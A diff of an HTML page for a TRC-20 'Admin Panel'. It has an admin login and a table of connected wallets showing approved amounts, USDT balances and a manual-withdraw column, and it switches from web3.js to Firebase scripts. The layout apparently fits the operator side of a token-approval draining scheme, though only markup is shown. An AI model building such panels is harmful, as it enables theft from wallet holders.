@@ -3,35 +3,36 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TRC-20 Admin Panel</title>
-  <link rel="stylesheet" href="admin.css" />
+  <title>Admin Panel (TRC-20)</title>
+  <link rel="stylesheet" href="admin.css">
 </head>
 <body>
-  <div class="container">
-    <h1>Admin Panel (TRC-20)</h1>
-    <div id="loginSection">
-      <input type="text" id="username" placeholder="Username" />
-      <input type="password" id="password" placeholder="Password" />
-      <button onclick="login()">Login</button>
-    </div>
-
-    <div id="dashboard" style="display:none;">
-      <h2>Connected Wallets</h2>
-      <table>
-        <thead>
-          <tr>
-            <th>Wallet Address</th>
-            <th>Approved Amount</th>
-            <th>USDT Balance</th>
-            <th>Manual Withdraw</th>
-          </tr>
-        </thead>
-        <tbody id="walletTableBody"></tbody>
-      </table>
-    </div>
+  <div class="login-container" id="loginContainer">
+    <h2>Admin Login (TRC-20)</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button id="loginBtn">Login</button>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script type="module" src="admin.js"></script>
+  <div class="admin-panel" id="adminPanel" style="display:none;">
+    <h2>Connected Wallets</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Wallet Address</th>
+          <th>Approved Amount</th>
+          <th>USDT Balance</th>
+          <th>Manual Withdraw</th>
+        </tr>
+      </thead>
+      <tbody id="walletTableBody">
+        <!-- Dynamic rows -->
+      </tbody>
+    </table>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js"></script>
+  <script src="admin.js"></script>
 </body>
 </html>
